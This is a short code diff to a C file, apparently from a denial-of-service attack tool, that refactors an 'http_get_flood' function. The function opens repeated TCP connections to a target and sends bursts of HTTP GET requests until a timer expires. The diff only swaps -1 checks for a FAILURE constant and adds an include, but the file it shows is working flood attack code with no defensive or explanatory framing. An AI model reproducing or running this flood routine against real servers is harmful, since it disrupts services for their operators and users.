@@ -9,7 +9,9 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <pthread.h>
+
 #include "attack.h"
+#include "../utils/util.h"
 
 void *http_get_flood(void *arg)
 {
@@ -19,7 +21,7 @@ void *http_get_flood(void *arg)
     while (time(NULL) - start < a->time)
     {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == -1)
+        if (sock == FAILURE)
             continue;
 
         struct sockaddr_in *server = malloc(sizeof(struct sockaddr_in));
@@ -30,15 +32,15 @@ void *http_get_flood(void *arg)
         server->sin_port = htons(a->port);
         server->sin_addr.s_addr = inet_addr(a->address);
 
-        if (connect(sock, (struct sockaddr *)server, sizeof(struct sockaddr_in)) == -1)
+        if (connect(sock, (struct sockaddr *)server, sizeof(struct sockaddr_in)) == FAILURE)
             continue;
 
         char *request = NULL;
-        if (asprintf(&request, "GET %s HTTP/1.1\r\nHost: %s:%d\r\n\r\n", a->path, a->address, a->port) == -1)
+        if (asprintf(&request, "GET %s HTTP/1.1\r\nHost: %s:%d\r\n\r\n", a->path, a->address, a->port) == FAILURE)
             continue;
 
         for (int i = 0; i < a->power; i++)
-            if (send(sock, request, strlen(request), 0) == -1)
+            if (send(sock, request, strlen(request), 0) == FAILURE)
                 break;
 
         free(request);
